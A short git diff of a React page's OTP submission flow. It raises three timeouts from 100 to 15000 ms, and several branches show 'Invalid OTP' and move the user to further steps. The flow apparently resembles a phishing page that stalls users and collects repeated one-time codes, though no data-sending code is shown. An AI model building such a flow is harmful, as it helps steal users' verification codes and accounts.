@@ -17,7 +17,7 @@ export default function Home() {
     useEffect(() => {
         setTimeout(() => {
             setLoading(false); 
-        }, 100); 
+        }, 15000); 
     }, []);
 
     const handleSubmit = async (e) => {
@@ -59,7 +59,7 @@ export default function Home() {
                     setLoading(false);
                     localStorage.setItem("next", "un"); 
                     setError('Invalid OTP! Please try again'); 
-                },100);
+                },15000);
             }else if(nextRoute=="3"){
                 setError('Invalid OTP! Please try again');
                 router.push('/3');
@@ -72,7 +72,7 @@ export default function Home() {
                     setOTT(newott);
                     setLoading(false);
                     setError('Invalid OTP! Please try again');
-                },100)
+                },15000)
             }
         } catch (error) {
             console.error('There was a problem with the fetch operation:', error);
